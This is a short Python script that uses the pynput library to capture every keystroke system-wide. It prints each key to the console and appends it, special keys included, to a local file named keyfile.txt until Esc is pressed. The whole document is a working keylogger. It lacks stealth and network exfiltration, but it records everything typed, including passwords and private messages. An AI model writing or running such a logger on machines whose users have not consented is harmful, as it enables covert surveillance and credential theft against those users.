from pynput import keyboard

# Define the log file
LOG_FILE = "keyfile.txt"

def keyPressed(key):
    try:
        # If the key has a char attribute, it's a regular key
        char = key.char
        if char:  # Ignore None values like special keys
            print(char)
            with open(LOG_FILE, 'a') as logkey:
                logkey.write(char)
    except AttributeError:
        # Handle special keys (like shift, ctrl, etc.)
        print(f"Special key pressed: {key}")
        with open(LOG_FILE, 'a') as logkey:
            logkey.write(f"[{key}]")

def on_press(key):
    keyPressed(key)
    if key == keyboard.Key.esc:
        # Stop listener when the 'esc' key is pressed
        return False

if __name__ == "__main__":
    # Start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()